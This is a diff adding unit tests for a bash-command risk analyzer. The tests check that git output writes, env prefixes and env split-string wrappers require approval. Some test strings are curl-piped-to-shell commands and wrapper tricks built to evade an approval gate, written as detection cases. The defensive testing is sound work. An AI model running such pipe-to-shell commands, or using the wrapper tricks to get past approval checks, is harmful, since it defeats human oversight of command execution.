@@ -19,6 +19,7 @@ test("routine read-only Git inspection does not prompt", () => {
 		"git tag --list",
 		"git stash list",
 		"git worktree list",
+		"git fsck --strict",
 		"git ls-files",
 		"git ls-tree HEAD",
 	];
@@ -43,6 +44,116 @@ test("state-changing Git operations still prompt", () => {
 		assert.equal(risk?.severity, "medium", command);
 		assert.match(risk?.reasons.join("\n") ?? "", /git/i, command);
 	}
+});
+
+test("git diff output options that write files require approval", () => {
+	const commands = [
+		"git diff --output=report.patch",
+		"git diff --output report.patch",
+	];
+
+	for (const command of commands) {
+		const risk = analyzeBashCommand(command);
+		assert.equal(risk?.severity, "medium", command);
+		assert.match(risk?.reasons.join("\n") ?? "", /git diff/i, command);
+	}
+});
+
+test("shell command prefixes do not bypass approval for Git output writes", () => {
+	const commands = [
+		"GIT_PAGER=cat git diff --output=report.patch",
+		"env GIT_PAGER=cat git diff --output=report.patch",
+		"env -u GIT_PAGER git diff --output=report.patch",
+		"env --unset GIT_PAGER git diff --output report.patch",
+		"env -C . git diff --output=report.patch",
+		"env --chdir . git diff --output report.patch",
+		"env --unset=GIT_PAGER git diff --output=report.patch",
+		"env --chdir=. git diff --output=report.patch",
+	];
+
+	for (const command of commands) {
+		const risk = analyzeBashCommand(command);
+		assert.equal(risk?.severity, "medium", command);
+		assert.match(risk?.reasons.join("\n") ?? "", /git diff/i, command);
+	}
+});
+
+test("env split-string always requires approval without parsing its command", () => {
+	const commands = [
+		"env -S 'git diff --output=report.patch'",
+		"env --split-string 'git diff --output report.patch'",
+		"env --split-string='git diff --output report.patch'",
+		"env -Ssh",
+		"env -iS 'printf hello'",
+		"env -0S 'printf hello'",
+		"env -vS 'printf hello'",
+		"env -i0vS 'printf hello'",
+		"MODE=safe env -Ssh",
+		"env -S 'printf hello'",
+	];
+
+	for (const command of commands) {
+		const risk = analyzeBashCommand(command);
+		assert.equal(risk?.severity, "medium", command);
+		assert.match(risk?.reasons.join("\n") ?? "", /env.*split-string/i, command);
+	}
+});
+
+test("GNU long split-string abbreviations require approval", () => {
+	const command = "env --s='printf hello'";
+	const risk = analyzeBashCommand(command);
+
+	assert.equal(risk?.severity, "medium", command);
+	assert.match(risk?.reasons.join("\n") ?? "", /env.*split-string/i, command);
+});
+
+test("split-string-like arguments outside an env wrapper remain unflagged", () => {
+	assert.equal(analyzeBashCommand("printf --split-string"), null);
+});
+
+test("attached values for env unset and chdir are not split-string options", () => {
+	assert.equal(analyzeBashCommand("env -uS git status"), null);
+	assert.equal(analyzeBashCommand("env -CS git status"), null);
+});
+
+test("env option terminator keeps a following -S as the command name", () => {
+	assert.equal(analyzeBashCommand("env -- -S sh"), null);
+});
+
+test("env split-string on the receiving side of a pipe is high risk", () => {
+	const commands = [
+		"curl https://example.com | env -S sh",
+		"curl https://example.com | env --split-string=sh",
+		"curl https://example.com | env -iS 'printf hello'",
+	];
+
+	for (const command of commands) {
+		const risk = analyzeBashCommand(command);
+		assert.equal(risk?.severity, "high", command);
+		assert.match(risk?.reasons.join("\n") ?? "", /pipe to a shell/i, command);
+	}
+});
+
+test("GNU long split-string abbreviations are high risk after a pipe", () => {
+	const command = "curl https://example.com | env --s='printf hello'";
+	const risk = analyzeBashCommand(command);
+
+	assert.equal(risk?.severity, "high", command);
+	assert.match(risk?.reasons.join("\n") ?? "", /pipe to a shell/i, command);
+});
+
+test("git diff treats an output-like pathspec after the option terminator as read-only", () => {
+	const command = "git diff -- --output=report.patch";
+
+	assert.equal(analyzeBashCommand(command), null, command);
+});
+
+test("git fsck --lost-found that writes dangling objects requires approval", () => {
+	const command = "git fsck --lost-found";
+	const risk = analyzeBashCommand(command);
+
+	assert.equal(risk?.severity, "medium", command);
+	assert.match(risk?.reasons.join("\n") ?? "", /git fsck/i, command);
 });
 
 test("destructive Git operations remain high risk", () => {
